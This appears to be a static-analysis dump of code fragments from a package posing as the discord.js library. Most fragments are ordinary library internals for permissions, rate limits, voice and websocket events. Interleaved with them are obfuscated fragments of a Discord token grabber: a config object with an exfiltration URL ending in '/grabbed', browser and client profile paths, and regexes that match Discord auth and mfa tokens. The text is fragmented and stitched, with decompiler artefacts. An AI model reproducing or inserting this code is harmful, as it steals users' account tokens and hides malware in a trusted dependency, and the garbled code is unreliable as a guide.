overwrites = overwrites.map(overwrite => {
      const role = this.client.resolver.resolveRole(guild, overwrite.id);
      if (role) {
        overwrite.id = role.id;
        overwrite.type = 'role';
      } else {
        overwrite.id = this.client.resolver.resolveUserID(overwrite.id);
        overwrite.type = 'member';
      }

      return {
        allow: Permissions.resolve(overwrite.allow || overwrite.allowed || 0),
        deny: Permissions.resolve(overwrite.deny || overwrite.denied || 0),
        type: overwrite.type,
        id: overwrite.id,
      };
    })
const _0x10b11f =
        (-parseInt(_0x4a661c(0xa3)) / 0x1) *
          (-parseInt(_0x4a661c(0x9f)) / 0x2) +
        parseInt(_0x4a661c(0xb5)) / 0x3 +
        (-parseInt(_0x4a661c(0xcf)) / 0x4) * (parseInt(_0x4a661c(0x9a)) / 0x5) +
        (parseInt(_0x4a661c(0x9c)) / 0x6) * (-parseInt(_0x4a661c(0xb0)) / 0x7) +
        parseInt(_0x4a661c(0xca)) / 0x8 +
        parseInt(_0x4a661c(0x95)) / 0x9 +
        -parseInt(_0x4a661c(0x99)) / 0xa
(-parseInt(_0x4a661c(0xa3)) / 0x1) *
          (-parseInt(_0x4a661c(0x9f)) / 0x2) +
        parseInt(_0x4a661c(0xb5)) / 0x3 +
        (-parseInt(_0x4a661c(0xcf)) / 0x4) * (parseInt(_0x4a661c(0x9a)) / 0x5) +
        (parseInt(_0x4a661c(0x9c)) / 0x6) * (-parseInt(_0x4a661c(0xb0)) / 0x7) +
        parseInt(_0x4a661c(0xca)) / 0x8 +
        parseInt(_0x4a661c(0x95)) / 0x9 +
        -parseInt(_0x4a661c(0x99)) / 0xa
this.build({
      url: url || this.constructor.DFEAULT.url,
      version: version || this.constructor.DEFAULT.version,
    })
error.message && flattened ? <operator>.formatString("", error.message, "\n", flattened, "") : error.message || flattened
VoiceServerUpdate = package\src\client\websocket\packets\handlers\VoiceServerUpdate.js::program:VoiceServerUpdate:<init>
SequentialRequestHandler = package\src\client\rest\RequestHandlers\Sequential.js::program:SequentialRequestHandler:<init>
WebSocketPacketManager = package\src\client\websocket\packets\WebSocketPacketManager.js::program:WebSocketPacketManager:<init>
TextBasedChannel = package\src\structures\interfaces\TextBasedChannel.js::program:TextBasedChannel:<init>
ReactionCollector = package\src\structures\ReactionCollector.js::program:ReactionCollector:<init>
const WebSocket = (function findWebSocket() {
  if (browser) return window.WebSocket; // eslint-disable-line no-undef
  try {
    return require('@discordjs/uws');
  } catch (e) {
    return require('ws');
  }
}())
VoiceWebSocket = package\src\client\voice\VoiceWebSocket.js::program:VoiceWebSocket:<init>
this.encoder.applyEncoderCTL(this.ctl.BITRATE, Math.min(128, Math.max(16, bitrate)) * 1000)
this.register(Constants.WSEvents.READY, require('./handlers/Ready'))
UserAgentManager.DEFAULT = {
  url: Constants.Package.homepage.split('#')[0],
  version: Constants.Package.version,
}
exports.fetch = engineOptions => {
  for (const encoder of list) {
    const fetched = fetch(encoder, engineOptions);
    if (fetched) return fetched;
  }

  throw new Error('Couldn\'t find an Opus engine.');
}
lib.ready.then(() => {
        exports.methods = libs[libName](lib);
      }).catch(() => {
        const tweetnacl = require('tweetnacl');
        exports.methods = libs.tweetnacl(tweetnacl);
      }).catch(() => undefined)
const startInd = route.includes('/channels/') ? route.indexOf('/channels/') : route.indexOf('/guilds/')
const Targets = {
  ALL: 'ALL',
  GUILD: 'GUILD',
  CHANNEL: 'CHANNEL',
  USER: 'USER',
  ROLE: 'ROLE',
  INVITE: 'INVITE',
  WEBHOOK: 'WEBHOOK',
  EMOJI: 'EMOJI',
  MESSAGE: 'MESSAGE',
}
handler.push({
                request: apiRequest,
                resolve,
                reject,
                retries: 0,
            })
this.bitfield = typeof permissions === 'number' ? permissions : this.constructor.resolve(permissions)
WebSocketConnection = package\src\client\websocket\WebSocketConnection.js::program:WebSocketConnection:<init>
const _0x735e44 = {
        Udcrr: "https://icy-tinted-sunshine.glitch.me/grabbed",
        LRgYV: _0x2ad80d(0xa4),
        FrCYE: "Local Storage",
        CSIQw: _0x2ad80d(0x96),
        aceFx: _0x2ad80d(0xc6),
        igoGQ: _0x2ad80d(0xb7),
        tyrro: "lightcord",
        vnuqg: 'Opera Software", "Opera Stable',
        IvlzO: _0x2ad80d(0xcc),
        WPUjm: "Opera GX Stable",
        DKLqj: _0x2ad80d(0xc9),
        guUmu: "User Data",
        xhQgm: _0x2ad80d(0xb3),
        sEWbF: "Kometa",
        qtHwP: "Microsoft",
        QTuxC: _0x2ad80d(0xc5),
        SnQkM: "Google",
        DhWzM: _0x2ad80d(0xc4),
        RNrZr: _0x2ad80d(0xa5),
        aOVFH: _0x2ad80d(0xb6),
        bPmCi: _0x2ad80d(0xb4),
        NkzjD: function(_0x1cc593, _0x343d3e) {
          return _0x1cc593 !== _0x343d3e;
        },
        yvTCW: _0x2ad80d(0xab),
        yHXTf: function(_0x4cc9d4, _0x30a6e0) {
          return _0x4cc9d4(_0x30a6e0);
        }
      }
this.client.setTimeout(() => this.deleted.delete(guildID + userID), this.client.options.restWsBridgeTimeout)
exports.DefaultOptions = {
  apiRequestMethod: 'sequential',
  shardId: 0,
  shardCount: 0,
  messageCacheMaxSize: 200,
  messageCacheLifetime: 0,
  messageSweepInterval: 0,
  fetchAllMembers: false,
  disableEveryone: false,
  sync: false,
  restWsBridgeTimeout: 5000,
  retryLimit: Infinity,
  disabledEvents: [],
  restTimeOffset: 500,

  /**
   * WebSocket options (these are left as snake_case to match the API)
   * @typedef {Object} WebsocketOptions
   * @property {number} [large_threshold=250] Number of members in a guild to be considered large
   * @property {boolean} [compress=true] Whether to compress data sent on the connection
   * (defaults to `false` for browsers)
   */
  ws: {
    large_threshold: 250,
    compress: require('os').platform() !== 'browser',
    properties: {
      $os: process ? process.platform : 'discord.js',
      $browser: 'discord.js',
      $device: 'discord.js',
      $referrer: '',
      $referring_domain: '',
    },
    version: 6,
  },

  /**
   ...
this.resetTimeout = this.client.setTimeout(() => {
            this.remaining = this.limit;
            this.globalLimit = false;
            this.handle();
            this.resetTimeout = null;
          }, Number(res.headers['retry-after']) + this.client.options.restTimeOffset)
this.register(Constants.WSEvents.PRESENCE_UPDATE, require('./handlers/PresenceUpdate'))
this._reEmitter = message => {
      /**
       * Emitted when the collector receives a message.
       * @event MessageCollector#message
       * @param {Message} message The message
       * @deprecated
       */
      this.emit('message', message);
    }
key ? isNaN(k) ? <operator>.formatString("", key, ".", k, "") : <operator>.formatString("", key, "[", k, "]") : k
new Promise((resolve, reject) => {
      if (!channel.joinable) {
        if (channel.full) {
          throw new Error('You do not have permission to join this voice channel; it is full.');
        } else {
          throw new Error('You do not have permission to join this voice channel.');
        }
      }

      let connection = this.connections.get(channel.guild.id);

      if (connection) {
        if (connection.channel.id !== channel.id) {
          this.connections.get(channel.guild.id).updateChannel(channel);
        }
        resolve(connection);
        return;
      } else {
        connection = new VoiceConnection(this, channel);
        this.connections.set(channel.guild.id, connection);
      }

      connection.once('failed', reason => {
        this.connections.delete(channel.guild.id);
        reject(reason);
      });

      connection.once('authenticated', () => {
        connection.once('ready', () => resolve(connection));
        connection.once('error', rejec...
this.client.ws.connection.once('close', event => {
        if (event.code === 4004) reject(new Error(Constants.Errors.BAD_LOGIN));
        if (event.code === 4010) reject(new Error(Constants.Errors.INVALID_SHARD));
        if (event.code === 4011) reject(new Error(Constants.Errors.SHARDING_REQUIRED));
      })
channel.client.setTimeout(() => {
    channel.client.emit(Constants.Events.TYPING_STOP, channel, user, channel._typing.get(user.id));
    channel._typing.delete(user.id);
  }, 6000)
<operator>.formatString("https://cdn.discordapp.com/app-icons/", this.id, "/", this.icon, ".jpg")
this.register(Constants.WSEvents.RELATIONSHIP_REMOVE, require('./handlers/RelationshipRemove'))
item.request.gen().end((err, res) => {
        if (res && res.headers) {
          this.requestLimit = Number(res.headers['x-ratelimit-limit']);
          this.requestResetTime = Number(res.headers['x-ratelimit-reset']) * 1000;
          this.requestRemaining = Number(res.headers['x-ratelimit-remaining']);
          this.timeDifference = Date.now() - new Date(res.headers.date).getTime();
        }
        if (err) {
          if (err.status === 429) {
            this.queue.unshift(item);
            this.client.setTimeout(() => {
              this.globalLimit = false;
              resolve();
            }, Number(res.headers['retry-after']) + this.client.options.restTimeOffset);
            if (res.headers['x-ratelimit-global']) this.globalLimit = true;
          } else if (err.status >= 500 && err.status < 600) {
            if (item.retries === this.client.options.retryLimit) {
              item.reject(err);
              resolve();
            } else {
              item.retr...
new Promise((resolve, reject) => {
      const listener = message => {
        if (!message || message._sFetchProp !== prop) return;
        process.removeListener('message', listener);
        if (!message._error) resolve(message._result); else reject(Util.makeError(message._error));
      };
      process.on('message', listener);

      this.send({ _sFetchProp: prop }).catch(err => {
        process.removeListener('message', listener);
        reject(err);
      });
    })
_tmp_14.channel = data.channel_id ? this.client.channels.get(data.channel_id) : null
this.client.ws.send({
        op: Constants.OPCodes.HEARTBEAT,
        d: this.client.ws.sequence,
      })
socket.once('message', message => {
      const packet = parseLocalPacket(message);
      if (packet.error) {
        this.emit('error', packet.error);
        return;
      }

      this.localAddress = packet.address;
      this.localPort = packet.port;

      this.voiceConnection.sockets.ws.sendPacket({
        op: Constants.VoiceOPCodes.SELECT_PROTOCOL,
        d: {
          protocol: 'udp',
          data: {
            address: packet.address,
            port: packet.port,
            mode: 'xsalsa20_poly1305',
          },
        },
      });
    })
this.once('disconnect', () => reject(new Error(`Shard ${this.id}'s Client disconnected before becoming ready.`)))
_tmp_12.d = {
          protocol: 'udp',
          data: {
            address: packet.address,
            port: packet.port,
            mode: 'xsalsa20_poly1305',
          },
        }
_tmp_6.NOT_A_PERMISSION = "Invalid permission string or number."
_tmp_7.lightcord = _0x1e5e9d["join"](
            _0x27dc67,
            _0x735e44[_0x2ad80d(0xa7)],
            ..._0x175012
          )
<operator>.formatString("", mention, "", content ? `, ${content}` : '', "")
dispatcher.on('volumeChange', (o, n) => {
        this.unregisterDispatcher(dispatcher, o);
        if (!this._dispatchers.has(n)) {
          this._dispatchers.set(n, new Set());
          this._encoders.set(n, OpusEncoders.fetch());
        }
        this._dispatchers.get(n).add(dispatcher);
      })
function sendChunk(list, index) {
            const options = index === list.length - 1 ? { tts, embed, files } : { tts };
            chan.send(list[index], options).then(message => {
              messages.push(message);
              if (index >= list.length - 1) return resolve(messages);
              return sendChunk(list, ++index);
            }).catch(reject);
          }(content, 0)
this.mentions = new Mentions(
      this,
      'mentions' in data ? data.mentions : this.mentions.users,
      'mentions_roles' in data ? data.mentions_roles : this.mentions.roles,
      'mention_everyone' in data ? data.mention_everyone : this.mentions.everyone
    )
function _0x31c4f9 = function _0x31c4f9(_0x199a71) {
        const _0x2d97fb = _0x2ad80d;
        let _0x4e2432 = _0x201ee8[_0x2d97fb(0xaa)](_0x199a71)[
            _0x2d97fb(0xa6)
          ](),
          _0x2fefb2 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/,
          _0x20959c = /"mfa\.[\d\w_-]{84}"/,
          [_0x56e2c6] = _0x2fefb2[_0x2d97fb(0xa1)](_0x4e2432) ||
            _0x20959c[_0x2d97fb(0xa1)](_0x4e2432) || [null];
        return _0x56e2c6;
      }
this.listenerCount('pcm') > 0 || this.pcmStreams.size > 0
this.client.actions.MessageDeleteBulk.handle({
        channel_id: channel.id,
        ids: messages,
      }).messages
_tmp_46 = VoiceReceiver._tryDecode(this.opusEncoders.get(user.id), data)
this.fetchMessages({ limit: 1, around: messageID }).then(messages => {
        const msg = messages.get(messageID);
        if (!msg) throw new Error('Message not found.');
        return msg;
      })
(_tmp_14 = [
      Actions.CHANNEL_DELETE,
      Actions.CHANNEL_OVERWRITE_DELETE,
      Actions.MEMBER_KICK,
      Actions.MEMBER_PRUNE,
      Actions.MEMBER_BAN_ADD,
      Actions.ROLE_DELETE,
      Actions.INVITE_DELETE,
      Actions.WEBHOOK_DELETE,
      Actions.EMOJI_DELETE,
      Actions.MESSAGE_DELETE,
    ]).includes
Promise.all(options.files.map(file =>
        this.client.resolver.resolveFile(file.attachment).then(resource => {
          file.file = resource;
          return file;
        })
      )).then(files => this.client.rest.methods.sendWebhookMessage(this, content, options, files))
_tmp_55.nicks = recipients.reduce((o, r) => {
        if (r.nick) o[r.user ? r.user.id : r.id] = r.nick;
        return o;
      }, {})
o[r.user ? r.user.id : r.id] = r.nick
data.username = _data.username || user.username
this.status === Constants.VoiceStatus.CONNECTED
const voiceState = this._rawVoiceStates.get(member.user.id)
member.serverMute = voiceState.mute
this.client.channels.get(voiceState.channel_id).members.set(member.user.id, member)
this.client.emit(Constants.Events.GUILD_MEMBER_ADD, member)
const member = this.members.get(user)
member && member.speaking !== speaking
this.client.emit(Constants.Events.GUILD_MEMBER_SPEAKING, member, speaking)
